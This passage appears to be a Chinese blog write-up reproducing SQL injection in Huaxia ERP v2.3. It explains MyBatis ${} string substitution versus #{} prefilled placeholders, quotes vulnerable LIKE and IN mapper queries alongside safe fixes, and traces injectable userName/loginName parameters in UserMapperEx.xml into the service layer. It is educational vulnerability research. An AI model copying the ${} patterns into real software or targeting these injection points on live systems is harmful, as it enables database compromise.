<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.mapper.UserMapper&quot;</span>&gt;</span> <span class="comment">&lt;!-- 指定对应的接口全限定名 --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 结果映射：将查询结果封装到 User 对象中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;UserResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span> <span class="attr">column</span>=<span class="string">&quot;username&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;email&quot;</span> <span class="attr">column</span>=<span class="string">&quot;email&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- SQL 语句：id 与接口方法名对应 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUserById&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;UserResult&quot;</span>&gt;</span></span><br><span class="line">        SELECT * FROM users WHERE id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAllUsers&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;UserResult&quot;</span>&gt;</span></span><br><span class="line">        SELECT * FROM users</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">        INSERT INTO users (username, email) VALUES (#&#123;username&#125;, #&#123;email&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>然后我们可以在java代码中通过sqlSession调用getMapper方法实现接口，实际上是MyBatis提前为我们准备好了接口的实现类</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取 SqlSession（通常由 Spring 依赖注入管理，此处为示例）</span></span><br><span class="line"><span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 2. 获取 Mapper 接口的代理实现</span></span><br><span class="line">    <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 调用方法，MyBatis 会自动执行对应的 SQL</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.selectUserById(<span class="number">1</span>);</span><br><span class="line">    List&lt;User&gt; users = mapper.selectAllUsers();</span><br><span class="line">    </span><br><span class="line">    <span class="type">User</span> <span class="variable">newUser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;alice@example.com&quot;</span>);</span><br><span class="line">    mapper.insertUser(newUser);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 提交事务（如果是增删改）</span></span><br><span class="line">    sqlSession.commit();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">// 5. 关闭会话</span></span><br><span class="line">    sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>于是我们可以通过对应Mapper接口中定义的id调用方法然后返回执行结果，但是在执行的sql语句中存在两个特殊的语法<code>#&#123;name&#125;</code>和<code>$&#123;name&#125;</code>，虽然都是作为参数传递方式，但是有区别</p>
<p>简单来说，它们的根本区别在于：</p>
<ul>
<li><strong><code>#&#123;name&#125;</code>：是参数占位符（预编译）</strong> -&gt; <strong>安全</strong></li>
<li><strong><code>$&#123;name&#125;</code>：是字符串拼接（直接替换）</strong> -&gt; <strong>危险</strong></li>
</ul>
<p>也就是说<code>$&#123;&#125;</code>这种写法和直接执行sql语句没什么区别，我们可以通过在文件中搜寻<code>$&#123;</code>的方式来找到sql注入点</p>
<p><strong>MyBatis产生漏洞的情况</strong></p>
<p><strong>使用Like语句</strong></p>
<p>在这种情况下使用 <code>#&#123;&#125;</code> 程序会报错，新手程序员就把 <code>#号</code> 改成了 <code>$</code>，这就照样导致了拼接的问题了。</p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByUserNameVuln02&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    select * from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>正确的写法如下</p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByUserNamesec&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    select * from users where username like concat(&#x27;%&#x27;,#&#123;_parameter&#125;, &#x27;%&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>通过concat进行拼接</p>
<div class="code-container" code-lang="Sql"><div class="codebox"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql:</span><br><span class="line">    <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> concat(<span class="string">&#x27;%&#x27;</span>,#&#123;username&#125;,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">oracle:</span><br><span class="line">    <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span><span class="operator">||</span>#&#123;username&#125;<span class="operator">||</span><span class="string">&#x27;%&#x27;</span></span><br><span class="line">sqlserver:</span><br><span class="line">    <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%&#x27;</span><span class="operator">+</span>#&#123;username&#125;<span class="operator">+</span><span class="string">&#x27;%&#x27;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>不同的数据库写法还不一样</p>
<p><strong>使用in语句</strong></p>
<p>使用in语句时直接使用 <code>#&#123;&#125;</code> 会报错，可能会存在使用 <code>$&#123;&#125;</code> 直接拼接，造成sql注入</p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByUserNameVuln04&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    select * from users where id in ($&#123;id&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>正确用法为使用 foreach，<code>而不是将#替换为$</code></p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findByIdSec04&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;String&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;User&quot;</span>&gt;</span>  </span><br><span class="line"> SELECT  </span><br><span class="line"> * from users WHERE id IN <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;id&quot;</span> <span class="attr">item</span>=<span class="string">&quot;id&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span>  </span><br><span class="line"> #&#123;id&#125;  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p><strong>使用order by语句</strong></p>
<p>和JDBC同理，使用 <code>#&#123;&#125;</code> 方式传参会导致order by语句失效，所以使用order by语句的时候还是需要做好过滤，最好的办法就是做白名单过滤</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/08/29/%E5%8D%8E%E5%A4%8F-ERP-CMS-v2-3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20250829221346740.png" class title="image-20250829221346740">

<p>找是找到了一堆使用<code>$&#123;</code>拼接sql语句进行执行的xml文件，但是这些并不是都能触发漏洞，我太菜了判断不了，所以只能可以触发和不能触发都看看</p>
<p>我们先来看有没有上面那三种语句出现，然后就是需要观察我们的文件是否可以控制，我太菜了，只能看已经被发现的漏洞</p>
<p>我在UserMapperEx.xml中找到</p>
<div class="code-container" code-lang="Xml"><div class="codebox"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectByConditionUser&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.jsh.erp.datasource.entities.UserExample&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;ResultMapEx&quot;</span>&gt;</span></span><br><span class="line">    select user.id, user.username, user.login_name, user.position, user.email, user.phonenum,</span><br><span class="line">    user.description, user.remark,user.isystem,org.id as orgaId,user.tenant_id,org.org_abr,</span><br><span class="line">    rel.user_blng_orga_dspl_seq,rel.id as orgaUserRelId,</span><br><span class="line">    (select r.name from jsh_user_business ub</span><br><span class="line">    inner join jsh_role r on ub.value=concat(&quot;[&quot;,r.id,&quot;]&quot;) and ifnull(r.delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;</span><br><span class="line">    where ub.type=&#x27;UserRole&#x27; and ub.key_id=user.id limit 0,1) roleName</span><br><span class="line">    FROM jsh_user user</span><br><span class="line">    left join jsh_orga_user_rel rel on user.id=rel.user_id and ifnull(rel.delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;</span><br><span class="line">    left join jsh_organization org on rel.orga_id=org.id and  ifnull(org.org_stcd,&#x27;0&#x27;) !=&#x27;5&#x27;</span><br><span class="line">    where 1=1</span><br><span class="line">    and ifnull(user.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;userName != null&quot;</span>&gt;</span></span><br><span class="line">        and user.username like &#x27;%$&#123;userName&#125;%&#x27;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;loginName != null&quot;</span>&gt;</span></span><br><span class="line">        and user.login_name like &#x27;%$&#123;loginName&#125;%&#x27;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    order by rel.user_blng_orga_dspl_seq,user.id desc</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;offset != null and rows != null&quot;</span>&gt;</span></span><br><span class="line">        limit #&#123;offset&#125;,#&#123;rows&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;countsByUser&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;java.lang.Long&quot;</span>&gt;</span></span><br><span class="line">    select count(user.id)</span><br><span class="line">    FROM jsh_user user</span><br><span class="line">    left join jsh_user_business ub on user.id=ub.key_id</span><br><span class="line">    left join jsh_orga_user_rel rel on user.id=rel.user_id and ifnull(rel.delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;</span><br><span class="line">    left join jsh_organization org on rel.orga_id=org.id and  ifnull(org.org_stcd,&#x27;0&#x27;) !=&#x27;5&#x27;</span><br><span class="line">    where 1=1</span><br><span class="line">    and ifnull(user.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)</span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;userName != null&quot;</span>&gt;</span></span><br><span class="line">        and user.username like &#x27;%$&#123;userName&#125;%&#x27;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;loginName != null&quot;</span>&gt;</span></span><br><span class="line">        and user.login_name like &#x27;%$&#123;loginName&#125;%&#x27;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这两个可能的利用点，于是去找对应的接口UserMapperEX.java</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapperEx</span> &#123;</span><br><span class="line"></span><br><span class="line">    List&lt;UserEx&gt; <span class="title function_">selectByConditionUser</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@Param(&quot;userName&quot;)</span> String userName,</span></span><br><span class="line"><span class="params">            <span class="meta">@Param(&quot;loginName&quot;)</span> String loginName,</span></span><br><span class="line"><span class="params">            <span class="meta">@Param(&quot;offset&quot;)</span> Integer offset,</span></span><br><span class="line"><span class="params">            <span class="meta">@Param(&quot;rows&quot;)</span> Integer rows)</span>;</span><br><span class="line"></span><br><span class="line">    Long <span class="title function_">countsByUser</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@Param(&quot;userName&quot;)</span> String userName,</span></span><br><span class="line"><span class="params">            <span class="meta">@Param(&quot;loginName&quot;)</span> String loginName)</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; <span class="title function_">getUserListByUserNameOrLoginName</span><span class="params">(<span class="meta">@Param(&quot;userName&quot;)</span> String userName,</span></span><br><span class="line"><span class="params">                                                <span class="meta">@Param(&quot;loginName&quot;)</span> String loginName)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">batDeleteOrUpdateUser</span><span class="params">(<span class="meta">@Param(&quot;ids&quot;)</span> String ids[], <span class="meta">@Param(&quot;status&quot;)</span> <span class="type">byte</span> status)</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;TreeNodeEx&gt; <span class="title function_">getNodeTree</span><span class="params">()</span>;</span><br><span class="line">    List&lt;TreeNodeEx&gt; <span class="title function_">getNextNodeTree</span><span class="params">(Map&lt;String, Object&gt; parameterMap)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>我们再来看在service层的方法，UserService.java，至于之前的select方法我没看到哪里用了，实际上应该也不能用</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Long <span class="title function_">countUser</span><span class="params">(String userName, String loginName)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Long result=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        result=userMapperEx.countsByUser(userName, loginName);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        JshException.readFail(logger, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" 